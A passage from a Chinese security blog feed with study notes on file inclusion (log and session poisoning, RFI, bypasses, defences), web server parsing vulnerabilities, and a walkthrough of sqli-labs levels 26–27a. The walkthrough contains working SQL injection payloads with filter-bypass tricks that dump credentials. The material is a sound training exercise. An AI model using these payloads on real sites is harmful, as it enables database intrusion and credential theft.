IIS7.0+win2003：%SystemDrive%\inetpub\logs\LogFiles<br>        配置⽂件：C:\Windows\System32\inetsrv\config\applicationHost.config<br>集成环境： ⼩⽪：phpstudy_pro\Extensions\Apache2.4.39\logs\access.log<br>        xampp：xampp\apache\logs\access.log<br>环境：<br>方便使用，制作一个具有文件包含漏洞的文件。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/65e9a762adfd431b8d4e423f77069104.png" alt="在这里插入图片描述"><br>访问，测试，日志会记录。<br>我们可以直接插入恶意的php代码，使其记录下来。<br>&#x3D;&#x3D;注意：浏览器会把&lt;&gt;编码，这种情况下，包含文件进来是执行不了里面的php代码的，这种情况我们可以使用burp绕过。&#x3D;&#x3D;</p><p>同时，这里还需要注意一个问题，不要发送多个请求，不然会造成同个请求会写入多个，但payload不一样，这时候如果无法解析，就会报错。</p><h1 id="十、phpinfo包含临时文件"><a href="#十、phpinfo包含临时文件" class="headerlink" title="十、phpinfo包含临时文件"></a>十、phpinfo包含临时文件</h1><p>原理：利用php post上传文件产生临时文件，phpinfo()读临时文件的路径和名字，本地包含该临时文件生成一句话后门。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/701f9a5ddf7948febc5aedfd4dd4c474.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/105a0ebaedfe473a8f3bb849a4c786cb.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/4cce4227f24d4873a0788ca532e75f86.png" alt="在这里插入图片描述"><br>这里可以参考P牛搭建的。</p><h1 id="十一、包含session"><a href="#十一、包含session" class="headerlink" title="十一、包含session"></a>十一、包含session</h1><p>先了解一下服务器上针对用户会话session的存储与处理是什么过程，只有了解了其存储和使用机制我们才能够合理的去利用它得到我们想要的结果。</p><h2 id="1、测试环境"><a href="#1、测试环境" class="headerlink" title="1、测试环境"></a>1、测试环境</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/77eadc28bc0d41b8ae23408bf329ee6a.png" alt="在这里插入图片描述"></p><h2 id="2、session存储"><a href="#2、session存储" class="headerlink" title="2、session存储"></a>2、session存储</h2><h3 id="（1）存储方式"><a href="#（1）存储方式" class="headerlink" title="（1）存储方式"></a>（1）存储方式</h3><p>java是将用户的session存入内存中，而php则是将session以文件的形式存储在服务器某个文件中，可以在php.ini里面设置session的存储位置session.save_path<br>知道session的存储后，总结常见的php-session默认存放位置是很有必要的，因为在很多时候服务器都是按照默认设置来运行的，这个时候假如我们发现了一个没有安全措施的session包含漏洞就可以尝试利用默认的会话存放路径去包含利用。</p><h3 id="（2）命名格式"><a href="#（2）命名格式" class="headerlink" title="（2）命名格式"></a>（2）命名格式</h3><p>如果某个服务器存在session包含漏洞，要想去成功的包含利用的话，首先必须要找到的是服务器是如何存放该文件的，只要知道了其命名格式我们才能够正确的去包含文件。</p><h2 id="3、session利用"><a href="#3、session利用" class="headerlink" title="3、session利用"></a>3、session利用</h2><p>LFI本地⽂件包含漏洞主要是包含本地服务器上存储的⼀些⽂件，例如Session会话⽂件、<br>⽇志⽂件、临时⽂件等。但是，只有我们能够控制包含的⽂件存储我们的恶意代码才能拿到<br>服务器权限。<br> 其中针对 LFI Session ⽂件的包含或许是现在⻅的⽐较多，简单的理解session⽂件包含<br>漏洞就是在⽤户可以控制session⽂件中的⼀部分信息，然后将这部分信息变成我们的精⼼构<br>造的恶意代码，之后去包含含有我们传⼊恶意代码的这个session⽂件就可以达到攻击效果。<br>利⽤条件： session⽂件路径已知，且其中内容部分可控。<br>利⽤姿势：<br> 分析session.php可以看到⽤户会话信息username的值⽤户是可控的，因为服务器没有对<br>该部分作出限制。那么我们就可以传⼊恶意代码就⾏攻击利⽤。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/53fa46371e044469b7979446a3798848.png" alt="在这里插入图片描述"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/42d7e46ee55c4a6896adde81e735cd85.png" alt="在这里插入图片描述"></p><h1 id="十二、远程文件包含（RFI）"><a href="#十二、远程文件包含（RFI）" class="headerlink" title="十二、远程文件包含（RFI）"></a>十二、远程文件包含（RFI）</h1><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1bee295acdc74410ba16609a4d96ce1f.png" alt="在这里插入图片描述"></p><h1 id="十三、绕过姿势"><a href="#十三、绕过姿势" class="headerlink" title="十三、绕过姿势"></a>十三、绕过姿势</h1><p>我们平常很多时候碰到的情况肯定不会是简单include $_GET【‘file’】；这样直接把变量传入包含函数的，在很多时候包含的变量&#x2F;文件不是完全可控的。<br>现在代码常做的限制有这些。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/90eb509566604436a781926e038cb9a7.png" alt="在这里插入图片描述"></p><h2 id="1、Bypass-指定前缀"><a href="#1、Bypass-指定前缀" class="headerlink" title="1、Bypass-指定前缀"></a>1、Bypass-指定前缀</h2><p>测试代码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/e4739b6f481d4c568c9b52e35e7108c2.png" alt="在这里插入图片描述"></p><h3 id="（1）LFI-目录遍历"><a href="#（1）LFI-目录遍历" class="headerlink" title="（1）LFI-目录遍历"></a>（1）LFI-目录遍历</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/df25a3cdb0a940bb9c9f87dea06be6b3.png" alt="在这里插入图片描述"></p><h3 id="（2）LFI-编码绕过"><a href="#（2）LFI-编码绕过" class="headerlink" title="（2）LFI-编码绕过"></a>（2）LFI-编码绕过</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/7e254877c4cc46829b44149d1767a0ae.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/fee3c0f958e84eb6a65fa36196f7c215.png" alt="在这里插入图片描述"></p><h2 id="2、Bypass-指定后缀"><a href="#2、Bypass-指定后缀" class="headerlink" title="2、Bypass-指定后缀"></a>2、Bypass-指定后缀</h2><p>测试代码<br><img src="http://120.48.107.243:9090/blog/2023/04/03/41c6e31a5b63434ebbfcaa2cc63cafcc.png" alt="在这里插入图片描述"></p><h3 id="（1）RFI-URL"><a href="#（1）RFI-URL" class="headerlink" title="（1）RFI-URL"></a>（1）RFI-URL</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/2757379c6d41444e8f062151b979cb3a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/73145da22c3e4017b79cfa75e14706b8.png" alt="在这里插入图片描述"></p><h2 id="3、LFI-压缩协议"><a href="#3、LFI-压缩协议" class="headerlink" title="3、LFI-压缩协议"></a>3、LFI-压缩协议</h2><h3 id="（1）利用姿势"><a href="#（1）利用姿势" class="headerlink" title="（1）利用姿势"></a>（1）利用姿势</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/9a1f2016b4c84d66946e4569281af152.png" alt="在这里插入图片描述"></p><h3 id="（2）利用phar协议"><a href="#（2）利用phar协议" class="headerlink" title="（2）利用phar协议"></a>（2）利用phar协议</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/d72ccfa41acf4078b05922b6333d9b83.png" alt="在这里插入图片描述"></p><h3 id="（3）利用zip协议"><a href="#（3）利用zip协议" class="headerlink" title="（3）利用zip协议"></a>（3）利用zip协议</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/b57d5b49569a492f881d8ef3abb69a56.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/01b2efbfd2854c72a5d4c5154b676f28-20230403124345519.png" alt="在这里插入图片描述"></p><h3 id="（4）LFI-长度截断"><a href="#（4）LFI-长度截断" class="headerlink" title="（4）LFI-长度截断"></a>（4）LFI-长度截断</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/9c3252f7398545c1860c2c30fae5db12-20230403124350805.png" alt="在这里插入图片描述"></p><h3 id="（5）LFI-零字节截断"><a href="#（5）LFI-零字节截断" class="headerlink" title="（5）LFI-零字节截断"></a>（5）LFI-零字节截断</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/03/eb70bba958f54ec896b82ed2040048a2.png" alt="在这里插入图片描述"></p><h2 id="4、Bypass-协议限制"><a href="#4、Bypass-协议限制" class="headerlink" title="4、Bypass-协议限制"></a>4、Bypass-协议限制</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/4f5c87f34c164d1db42ce4340e5dd964.png" alt="在这里插入图片描述"></p><h1 id="十四、防御方案"><a href="#十四、防御方案" class="headerlink" title="十四、防御方案"></a>十四、防御方案</h1><ol><li>严格判断包含中的参数是否外部可控，因为⽂件包含漏洞利⽤成功与否的关键点就<br>在于被包含的⽂件是否可被外部控制；</li><li>路径限制：限制被包含的⽂件只能在某⼀⽂件内，⼀定要禁⽌⽬录跳转字符，<br>如：”..&#x2F;“；</li><li>包含⽂件验证：验证被包含的⽂件是否是⽩名单中的⼀员；</li><li>尽量不要使⽤动态包含，可以在需要包含的⻚⾯固定写好，如：<br>include(‘head.php’)；</li><li>设置 allow_url_include 为 Off ；</li></ol><h1 id="十五、总结与后记"><a href="#十五、总结与后记" class="headerlink" title="十五、总结与后记"></a>十五、总结与后记</h1><p>本篇文章只是学习笔记，请注意。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> 文件包含漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> 文件包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件解析漏洞的学习</title>
      <link href="/2022/10/25/file_resolve/"/>
      <url>/2022/10/25/file_resolve/</url>
      
        <content type="html"><![CDATA[<p><strong>本篇文章只是学习笔记。</strong></p><h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>文件解析漏洞，是指web容器（Apache、nginx、iss等）在解析文件时出现了漏洞，以其他格式执行出脚本格式的效果从而黑客可以利用该漏洞实现非法文件的解析。</p><h1 id="二、web容器"><a href="#二、web容器" class="headerlink" title="二、web容器"></a>二、web容器</h1><p>web容器是一种服务程序，在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求，如tmocat、apache、nginx等。（可以理解为编程语言提供环境）<br>中间件：提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通，中间件处在操作系统和更高一级应用程序之间。<br>容器：给处于其中的应用程序组件（ASP,JSP,PHP）提供一个环境。使处于其中的应用程序组件之间跟容器中的环境变量接口交互，不必关注其他系统问题。<br>攻击者在利用上传漏洞时，通常会与web容器的解析漏洞配合在一起。</p><h1 id="三、IIS"><a href="#三、IIS" class="headerlink" title="三、IIS"></a>三、IIS</h1><h2 id="1、IIS6-0"><a href="#1、IIS6-0" class="headerlink" title="1、IIS6.0"></a>1、IIS6.0</h2><h3 id="（1）目录解析漏洞（-x2F-test-asp-x2F-1-jpg）"><a href="#（1）目录解析漏洞（-x2F-test-asp-x2F-1-jpg）" class="headerlink" title="（1）目录解析漏洞（&#x2F;test.asp&#x2F;1.jpg）"></a>（1）目录解析漏洞（&#x2F;test.asp&#x2F;1.jpg）</h3><p>在IIS5.x&#x2F;6.0中，在网站下建立文件夹的名字为.asp、.asa、.cer、.cdx的文件夹，你们其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如常见目录test.asp，那么&#x2F;test.asp&#x2F;1..jpg将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能那shell了。</p><h3 id="（2）文件名解析漏洞"><a href="#（2）文件名解析漏洞" class="headerlink" title="（2）文件名解析漏洞"></a>（2）文件名解析漏洞</h3><p>在IIS5.X&#x2F;6.0中，分号是后面的不被解析，也就是说xie.asp；，jpg会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种.asa .cer。而有些网站对用户上传的文件进行校验，只是校验后缀名。所以我们只要上传.asp；，jpg、.asa；，jpg、.cer；.jpg后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。<br>IIS6.0→主目录→配置→查看这几种扩展名都是指向同一个文件。<br>C：\WINDOWS\SYSTEM32\INETSRV\ASP.DLL所以都解析成asp。</p><h2 id="2、IIS7-X"><a href="#2、IIS7-X" class="headerlink" title="2、IIS7.X"></a>2、IIS7.X</h2><h3 id="（1）畸形解析漏洞"><a href="#（1）畸形解析漏洞" class="headerlink" title="（1）畸形解析漏洞"></a>（1）畸形解析漏洞</h3><p>在IIS7.0中，在默认Fast-CGI开启状况下，再加上php配置文件中，开启了cgi.fix_pathinfo导致漏洞产生 。<br>这并不是nginx或者iis7&#x2F;7.5本身的漏洞。<br><strong>漏洞产生的条件</strong>：</p><p>php.ini里的cgi.fix_pathinfo&#x3D;1<br>IIS7在Fast-CGI运行模式下<br>我们往图片里面加入phpinfo。<br>将文件保存成test.jpg格式，上传到服务器，上传成功后，直接访问test.jpg&#x2F;x.php，此时神奇的畸形解析开始发挥作用，test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。</p><h3 id="（2）windows环境解析漏洞"><a href="#（2）windows环境解析漏洞" class="headerlink" title="（2）windows环境解析漏洞"></a>（2）windows环境解析漏洞</h3><p>在windows环境下，xx.jpg【空格】或xx.jpg，这两类文件都是不允许存在的，若这样命令，windows会默认出去空格或点，黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单，若上传成功，空格和点都会被windows自动消除。</p><h1 id="四、Nginx"><a href="#四、Nginx" class="headerlink" title="四、Nginx"></a>四、Nginx</h1><h2 id="1、畸形解析漏洞"><a href="#1、畸形解析漏洞" class="headerlink" title="1、畸形解析漏洞"></a>1、畸形解析漏洞</h2><p>该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞<br><strong>cgi.fix_pathinfo</strong><br>这个选项位于配置文件php.ini中，默认值为1，表示开启，当php遇到文件路径&#x2F;test.png&#x2F;x.php，若&#x2F;test.png&#x2F;x.php不存在，则会去掉最后的&#x2F;x.php，然后判断&#x2F;test.php是否存在，若存在，则把&#x2F;test.png当做文件&#x2F;test.png&#x2F;x.php解析，如若test.png还不存在如果在其前面还有后缀，继续前面的步骤，以此类推，若是关闭该选项，访问&#x2F;test.jpg&#x2F;x.php只会返回找不到文件。<br><strong>security.limit_extensions</strong><br>在配置文件中，它位于&#x2F;etc&#x2F;php-fpm.d&#x2F;<a href="http://www.conf中/">www.conf中</a><br>这个选项开始是被注释了的也就是默认只允许执行php文件，可以在后面添加其他后缀，比如security.limit_extensions .jpg .php。像这样添加.jpg之后，.jpg文件也能以php格式来执行，修改了后需要service php-fpm restart重启php。<br><strong>环境</strong>：<br>vulhub&#x2F;nginx&#x2F;nginx_parsing_vulnerability</p><h2 id="2、nginx文件名逻辑漏洞CVE-2013-4547（-20-00）"><a href="#2、nginx文件名逻辑漏洞CVE-2013-4547（-20-00）" class="headerlink" title="2、nginx文件名逻辑漏洞CVE-2013-4547（%20%00）"></a>2、nginx文件名逻辑漏洞CVE-2013-4547（%20%00）</h2><p>影响nginx版本：nginx0.8.41~1.5.6<br>漏洞的原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。举个例子，假设服务器上存在文件：file.jpg【空格】，注意文件名的最后一个字符是空格，则可以通过访问：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a5b2971530594823ae5d6f40ff10d90e.png" alt="在这里插入图片描述"></p><h1 id="五、Apache"><a href="#五、Apache" class="headerlink" title="五、Apache"></a>五、Apache</h1><h2 id="1、未知扩展名解析漏洞"><a href="#1、未知扩展名解析漏洞" class="headerlink" title="1、未知扩展名解析漏洞"></a>1、未知扩展名解析漏洞</h2><p>在Apache 2.0.x&lt;&#x3D;2.0.59，Apache 2.2.x&lt;&#x3D;2.2.17,Apache 2.2.2&lt;&#x3D;2.2.8中Apache解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。<br>apache是从右到左开始判断解析，如果为不可识别解析，就再往左判断，比如，sh.php.owf.rar和.rar这两种后缀是apache不可识别的解析，apache就会把sh.php.pwf.rar解析成sh.php。如何判断是不是合法的后缀就是这个漏洞的利用关键，测试时可以尝试上传一个sh.php.rara.jpg.png..去测试是否是合法后缀。任意不识别的后缀，逐级向上识别。<br>只要不在<strong>mime.types</strong>当中的都不认识，可以到安装Apache的目录下找这个文件。</p><h2 id="2、Apache配置问题（-htaccess）"><a href="#2、Apache配置问题（-htaccess）" class="headerlink" title="2、Apache配置问题（.htaccess）"></a>2、Apache配置问题（.htaccess）</h2><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置，通过.htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、运行&#x2F;阻止特定用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。<br>&#x3D;&#x3D;.htaccess文件生效前提条件为：&#x3D;&#x3D;<br><strong>mod_rewrite模块开启<br>AllowOverride ALL</strong><br>要.htaccess的规则生效，则需要在apache开启rewrite重写模块，因为apache是多数都开启这个模块，所以规则一般都生效，以下这个，.htaccess的意思就是把所有名字里面含有jpg的文件当成php脚本来执行。当前目录下的所有jpg文件当成php文件执行。如果在Apache的conf里有这样一行设置，AddType application&#x2F;x-httpd-php .jpg即使扩展名是 .jpg ，也会以php来执行。</p><h2 id="3、apache-httpd换行解析漏洞（CVE-2017-15715）"><a href="#3、apache-httpd换行解析漏洞（CVE-2017-15715）" class="headerlink" title="3、apache httpd换行解析漏洞（CVE-2017-15715）"></a>3、apache httpd换行解析漏洞（CVE-2017-15715）</h2><h3 id="（1）原理"><a href="#（1）原理" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>正则表达式在结尾处$符号，如果设置了RegExp对象的Multiline属性，则$也匹配‘\n’或’\r’。<br>因为1.php\x0a &#x3D; 1.php\n，所以我们在上传文件名后面加上\0xa（换行符），也会以php文件形式解析执行。<br>&#x3D;&#x3D;该漏洞属于用户配置不当产生的漏洞，与具体中间件版本无关。&#x3D;&#x3D;<br>1.php\x0a&#x3D;&gt;1.php<br>apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被安装PHP后缀进行解析，导致绕过一些服务器的安全策略，该漏洞属于用户配置不当产生的漏洞，与具体中间件版本无关。<br><strong>影响版本：Apache 2.4.0-2.4.29</strong><br>环境：vulhub&#x2F;httpd&#x2F;CVE-2017-15715</p><h1 id="六、-user-ini"><a href="#六、-user-ini" class="headerlink" title="六、.user.ini"></a>六、.user.ini</h1><h2 id="1、-user-ini作用和配置"><a href="#1、-user-ini作用和配置" class="headerlink" title="1、.user.ini作用和配置"></a>1、.user.ini作用和配置</h2><p>.htaccess是伪静态环境配置文件，用于lamp。<br>.user.ini是lnmp文件，里面放的是你网站的文件夹路径地址，目的是防止跨目录访问和文件跨目录读取。<br>为了防止跨站，可将.user.ini放在网站根目录下，内容为：<br><img src="http://120.48.107.243:9090/blog/2023/04/03/184d90f8bf7540079a85e6b996b1f781.png" alt="在这里插入图片描述"></p><h2 id="2、-user-ini文件利用"><a href="#2、-user-ini文件利用" class="headerlink" title="2、.user.ini文件利用"></a>2、.user.ini文件利用</h2><p>利用条件：<br>1、服务器脚本语言为PHP<br>2、服务器使用CGI&#x2F;FastCGI模式<br>3、上传目录下要有课执行的php文件</p><h1 id="七、Windows操作系统文件命名规则"><a href="#七、Windows操作系统文件命名规则" class="headerlink" title="七、Windows操作系统文件命名规则"></a>七、Windows操作系统文件命名规则</h1><p>windows操作系统中，文件名不能以空格或.开头，也不能以空格或.结尾，当把一个文件命名为以空格或.开头或结尾时，会自动的去掉开头和结尾处的空格和.，利用此特性，也可能造成文件解析漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 漏洞学习 </category>
          
          <category> 文件解析漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 漏洞学习 </tag>
            
            <tag> 文件解析漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入靶场（六）</title>
      <link href="/2022/10/15/sql_lab_six/"/>
      <url>/2022/10/15/sql_lab_six/</url>
      
        <content type="html"><![CDATA[<h1 id="一、实操环境"><a href="#一、实操环境" class="headerlink" title="一、实操环境"></a>一、实操环境</h1><h2 id="1、操作系统"><a href="#1、操作系统" class="headerlink" title="1、操作系统"></a>1、操作系统</h2><ol><li>VMware虚拟机创建的win10系统</li><li>内存8GB</li><li>硬盘255GB</li><li>处理器AMD Ryzen 9 5900HX</li></ol><h2 id="2、操作项目"><a href="#2、操作项目" class="headerlink" title="2、操作项目"></a>2、操作项目</h2><p><strong>sql-lib项目，本篇文章介绍关卡26-30。</strong></p><h2 id="3、工具版本"><a href="#3、工具版本" class="headerlink" title="3、工具版本"></a>3、工具版本</h2><pre><code> 1. phpstudy 8.1.1.3  2. php版本 5.4.45nts  3. Apache2.4.39  4. MySQL5.7.26  5. Chrome</code></pre><h2 id="4、SQL注入目的"><a href="#4、SQL注入目的" class="headerlink" title="4、SQL注入目的"></a>4、SQL注入目的</h2><ol><li>判断是否允许注入</li><li>判断注入点类型</li><li>判断回显点</li><li>获取数据库信息</li><li>获取表信息 </li><li>获取字段信息</li></ol><h1 id="二、less26"><a href="#二、less26" class="headerlink" title="二、less26"></a>二、less26</h1><h2 id="1、判断注入"><a href="#1、判断注入" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>这一关将很多东西都过滤掉了，所以可以使用url编码也可以使用报错注入。</p><h2 id="2、获取数据库信息"><a href="#2、获取数据库信息" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p><a href="http://sql/Less-26/?id=1&#39;anandd(updataxml(1,concat(0x5e,database(),0x5e),1))anandd&#39;">http://sql/Less-26/?id=1&#39;anandd(updataxml(1,concat(0x5e,database(),0x5e),1))anandd&#39;</a><br><img src="http://120.48.107.243:9090/blog/2023/04/03/bcc32d7eff9b482b9384b5e385711aa2.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息"><a href="#3、获取表信息" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p><a href="http://sql/Less-26/?id=0&#39;||updatexml(1,concat(0x5e,(select(group_concat(table_name))from">http://sql/Less-26/?id=0&#39;||updatexml(1,concat(0x5e,(select(group_concat(table_name))from</a> (infoorrmation_schema.tables)where(table_schema&#x3D;database())),0x5e),1)||’<br><img src="http://120.48.107.243:9090/blog/2023/04/03/069ea6a523b84a0db13660bcd775506f.png" alt="在这里插入图片描述"></p><h2 id="4、获取字段名"><a href="#4、获取字段名" class="headerlink" title="4、获取字段名"></a>4、获取字段名</h2><p><a href="http://sql/Less-26/?id=0&#39;||updatexml(1,concat(0x5e,(select(group_concat(column_name))from">http://sql/Less-26/?id=0&#39;||updatexml(1,concat(0x5e,(select(group_concat(column_name))from</a> (infoorrmation_schema.columns)where(table_schema&#x3D;’security’)anandd(table_name&#x3D;’users’)),0x5e),1)||’<br><img src="http://120.48.107.243:9090/blog/2023/04/03/30fb51d49955456280f503985b778dc5.png" alt="在这里插入图片描述"></p><h2 id="5、获取用户名密码"><a href="#5、获取用户名密码" class="headerlink" title="5、获取用户名密码"></a>5、获取用户名密码</h2><p><a href="http://sql/Less-26/?id=0&#39;||updatexml">http://sql/Less-26/?id=0&#39;||updatexml</a>(1, concat(0x5e, ( select (group_concat(concat_ws(0x5e,username,passwoorrd))) from (security.users)%20 where (id&#x3D;1) ) )%20%20 ,1)||’<br><img src="http://120.48.107.243:9090/blog/2023/04/03/93bf61e524ed49448eb9740a8e8f76db.png" alt="在这里插入图片描述"></p><h1 id="三、less26a"><a href="#三、less26a" class="headerlink" title="三、less26a"></a>三、less26a</h1><h2 id="1、判断注入-1"><a href="#1、判断注入-1" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>这一关在上一关的基础上加上了括号进行闭合，同时在sql语句执行抛出错误后不在前台页面输出，所以不能用报错注入了。</p><h2 id="2、获取数据库信息-1"><a href="#2、获取数据库信息-1" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p><a href="http://sql/Less-26a/?id=1%27)anandd(length(database())=8)%7C%7C">http://sql/Less-26a/?id=1%27)anandd(length(database())=8)||</a>(%27<br>库名为8。<br><a href="http://sql/Less-26a/?id=1%27)anandd(substr(database(),1,1)=&#39;s&#39;)||">http://sql/Less-26a/?id=1%27)anandd(substr(database(),1,1)=&#39;s&#39;)||</a>(%27<br>第一个字母为s。</p><h2 id="3、获取表信息-1"><a href="#3、获取表信息-1" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p><a href="http://sql/Less-26a/?id=1&#39;)anandd">http://sql/Less-26a/?id=1&#39;)anandd</a> (substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;’security’)),1,1)&#x3D;’e’) ;%00<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c1b56bdc542f4382a1166f057e8d267c.png" alt="在这里插入图片描述"><br>同上，可以猜出来。</p><h2 id="4、获取用户名和密码"><a href="#4、获取用户名和密码" class="headerlink" title="4、获取用户名和密码"></a>4、获取用户名和密码</h2><p>?id&#x3D;1’) anandd (substr((select( concat_ws(‘,’,username,password)) from (security.users )),1,1)&#x3D;’D’) ;%00</p><h1 id="四、less27"><a href="#四、less27" class="headerlink" title="四、less27"></a>四、less27</h1><h2 id="1、判断注入-2"><a href="#1、判断注入-2" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>这一关似乎是上一关的升级版，为字符型注入，过滤了部分注释符号，空格和union select也被过滤了。</p><h2 id="2、获取数据库信息-2"><a href="#2、获取数据库信息-2" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p><a href="http://sql/Less-27/?id=0&#39;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,database(),2/*%0a*/||&#39;">http://sql/Less-27/?id=0&#39;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,database(),2/*%0a*/||&#39;</a><br><img src="http://120.48.107.243:9090/blog/2023/04/03/4fea6eda4ea8405c8afbf1febb8fb1af.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息-2"><a href="#3、获取表信息-2" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>id&#x3D;0’&#x2F;<em>%0a</em>&#x2F;uNiOn&#x2F;<em>%0a</em>&#x2F;sEleCt&#x2F;<em>%0a</em>&#x2F;1,2,group_concat(table_name)&#x2F;<em>%0a</em>&#x2F;from&#x2F;<em>%0a</em>&#x2F;information_schema.tables&#x2F;<em>%0a</em>&#x2F;where&#x2F;<em>%0a</em>&#x2F;table_schema&#x3D;’security’||’<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3ba413f4887f4cd3984de665e3881479.png" alt="在这里插入图片描述"></p><h2 id="4、获取字段信息"><a href="#4、获取字段信息" class="headerlink" title="4、获取字段信息"></a>4、获取字段信息</h2><p>id&#x3D;0’&#x2F;<em>%0a</em>&#x2F;uNiOn&#x2F;<em>%0a</em>&#x2F;sEleCt&#x2F;<em>%0a</em>&#x2F;1,2,group_concat(column_name)&#x2F;<em>%0a</em>&#x2F;from&#x2F;<em>%0a</em>&#x2F;information_schema.columns&#x2F;<em>%0a</em>&#x2F;where&#x2F;<em>%0a</em>&#x2F;table_schema&#x3D;’security’&#x2F;<em>%0a</em>&#x2F;and&#x2F;<em>%0a</em>&#x2F;table_name&#x3D;’users’||’<br><img src="http://120.48.107.243:9090/blog/2023/04/03/1802c055af7645bba1b3a7ea18d69231.png" alt="在这里插入图片描述"></p><h2 id="5、获取用户名密码-1"><a href="#5、获取用户名密码-1" class="headerlink" title="5、获取用户名密码"></a>5、获取用户名密码</h2><p>?id&#x3D;0’&#x2F;<em>%0a</em>&#x2F;UnIoN&#x2F;<em>%0a</em>&#x2F;SeLeCt&#x2F;<em>%0a</em>&#x2F;1,(SeLeCt&#x2F;<em>%0a</em>&#x2F;group_concat(concat_ws(‘$’,id,username,password))&#x2F;<em>%0a</em>&#x2F;from&#x2F;<em>%0a</em>&#x2F;users),3&#x2F;<em>%0a</em>&#x2F;||’<br><img src="http://120.48.107.243:9090/blog/2023/04/03/04b82d1e9d82474896e6819e7b0f35ee-20230403142942381.png" alt="在这里插入图片描述"></p><h1 id="五、less27a"><a href="#五、less27a" class="headerlink" title="五、less27a"></a>五、less27a</h1><h2 id="1、判断注入-3"><a href="#1、判断注入-3" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>过滤掉了空格，注释符，union select，这里使用布尔盲注</p><h2 id="2、获取数据库信息-3"><a href="#2、获取数据库信息-3" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>?id&#x3D;1”&#x2F;<em>%0a</em>&#x2F;and &#x2F;<em>%0a</em>&#x2F;length(database())&#x3D;8&#x2F;<em>%0a</em>&#x2F;||”<br>?id&#x3D;1”&#x2F;<em>%0a</em>&#x2F;and &#x2F;<em>%0a</em>&#x2F;substr(database(),1,8)&#x3D;’security’&#x2F;<em>%0a</em>&#x2F;||”<br><img src="http://120.48.107.243:9090/blog/2023/04/03/94154d96ff5d47ddae964daf3579d195.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息-3"><a href="#3、获取表信息-3" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>?id&#x3D;1”&#x2F;<em>%0a</em>&#x2F; and&#x2F;<em>%0a</em>&#x2F; substr((sEleCt &#x2F;<em>%0a</em>&#x2F;table_name &#x2F;<em>%0a</em>&#x2F;from &#x2F;<em>%0a</em>&#x2F;information_schema.tables 